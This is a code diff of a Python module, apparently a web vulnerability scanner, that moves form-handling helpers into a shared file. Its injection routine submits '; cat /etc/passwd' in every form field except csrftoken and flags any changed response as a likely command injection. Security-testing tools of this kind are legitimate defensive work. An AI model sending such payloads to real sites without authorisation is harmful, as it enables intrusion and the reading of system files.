@@ -1,6 +1,6 @@
-import httplib2, urllib, urllib2
-from BeautifulSoup import BeautifulSoup, SoupStrainer
+import httplib2
 from urlparse import urljoin, urlparse
+from helper import has_form, parse_form, post_request, create_params
 from sets import Set
 
 EXPLOIT_PATH = "exploits/"
@@ -18,40 +18,6 @@ class SCIModule:
         self.url = url
         self.pages = pages
         self.logs = {}
-
-    def has_form(self, html_page):
-        return len(BeautifulSoup(html_page, parseOnlyThese=SoupStrainer('form'))) != 0
-
-    def parse_form(self, soup):
-        form = soup.find('form')
-        attributes = []
-        for form_input in form.findAll('input'):
-            attribute = ()
-            for form_input_attr in form_input.attrs:
-                if form_input_attr[0] != 'type':
-                    if form_input_attr[0] == "name":
-                        attribute = (form_input_attr[1], "")
-                    elif form_input_attr[0] == "value":
-                        attribute = (attribute[0], form_input_attr[1])
-            if len(attribute) > 0:
-                attributes.append(attribute)
-        return attributes
-
-    def create_params(self, params):
-        values = {}
-        for attr in params:
-            if attr[1] == "":
-                values[attr[0]] = "a"
-            else:
-                values[attr[0]] = attr[1]
-        return values
-
-    def post_request(self, url, params):
-        values = self.create_params(params)
-        data = urllib.urlencode(values)
-        req = urllib2.Request(url, data)
-        rsp = urllib2.urlopen(req)
-        return rsp.read()
 
     def log_results(self, results, category):
         log = {}
@@ -96,17 +62,16 @@ class SCIModule:
         for web_page in self.pages:
             http = httplib2.Http()
             status, response = http.request(web_page)
-            if self.has_form(response):
-                soup = BeautifulSoup(response)
-                forms = self.parse_form(soup)
-                original_response = self.post_request(web_page, forms)
+            if has_form(response):
+                forms = parse_form(response)
+                original_response = post_request(web_page, forms)
                 injection_forms = []
                 for form_input in forms:
                     if form_input[0] == "csrftoken": # We don't have incentive to change this
                         injection_forms.append(form_input)
                     else:
                         injection_forms.append((form_input[0], "; cat /etc/passwd"))
-                new_response = self.post_request(web_page, injection_forms)
+                new_response = post_request(web_page, injection_forms)
                 if original_response != new_response: # That means that the webpage is different, possibly a successful case
-                    results.append((urlparse(web_page).path, self.create_params(injection_forms), "POST"))
+                    results.append((urlparse(web_page).path, create_params(injection_forms), "POST"))
         self.logs = self.log_results(results, EXPLOIT_CLASS)
